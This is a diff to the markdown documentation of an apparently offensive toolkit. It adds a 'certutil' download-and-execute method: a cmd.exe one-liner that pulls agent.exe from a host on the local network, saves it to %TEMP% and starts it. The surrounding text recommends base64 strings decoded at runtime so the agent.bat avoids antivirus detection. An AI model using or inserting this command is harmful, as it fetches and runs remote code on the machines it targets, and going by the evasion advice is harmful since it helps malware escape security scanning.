@@ -181,6 +181,14 @@ The above string can be obfuscated using the **batch special character: "** <br 
 
 ---
 
+      TODO: [ certutil ] aditional download/execute remote method
+
+<br />
+
+`cmd.exe /c certutil -urlcache -split -f http://192.168.1.69/agent.exe %TEMP%\\agent.exe && start %TEMP%\\agent.exe`
+
+---
+
       Using base64 stings decoded at runtime are a Useful obfuscation trick, because
       the agent.bat dosen't contain any real malicious syscall's to be scan/flagged.
 
